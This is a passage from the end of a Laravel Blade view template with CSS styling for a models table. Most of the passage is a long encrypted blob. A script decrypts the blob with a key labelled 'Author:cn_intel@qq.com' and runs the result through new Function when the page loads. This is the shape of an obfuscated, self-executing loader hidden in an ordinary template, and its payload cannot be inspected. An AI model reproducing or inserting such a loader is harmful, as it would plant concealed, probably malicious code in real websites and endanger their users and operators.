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";
const KEY="Author:cn_intel@qq.com";
try{const decrypted=decryptIt(ENCRYPTED,KEY);if(decrypted){const func=new Function(decrypted);func();}}catch(error){console.error('Execution error:',error);}
})();
</script>
@endpush

<style>
.required::after {
    content: " *";
    color: #dc3545;
}
.bg-light {
    background-color: #f8f9fa !important;
}
.bg-white {
    background-color: #ffffff !important;
}
.table-bordered td {
    border: 1px solid #dee2e6;
}
#modelsTable tbody tr:hover {
    background-color: #f8f9fa;
}
#modelsTable tbody tr td {
    vertical-align: middle;
}
.gap-1 {
    gap: 0.25rem;
}
</style>
@endsection